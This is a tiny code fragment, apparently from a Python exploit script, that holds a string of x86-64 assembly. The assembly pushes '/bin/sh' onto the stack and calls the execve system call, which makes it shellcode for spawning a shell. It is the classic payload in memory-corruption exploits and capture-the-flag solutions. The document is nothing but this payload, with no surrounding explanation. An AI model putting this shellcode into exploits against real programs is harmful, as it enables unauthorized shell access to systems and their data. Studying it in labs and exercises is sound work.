assembly = '''
    mov rax, 59  /* execve */
    mov rbx, 0x0068732f6e69622f /* "/bin/sh" including nul-terminator */
    push rbx
    mov rdi, rsp /* <file> */
    mov rsi, 0   /* <argv> */
    mov rdx, 0   /* <envp> */
    syscall
'''
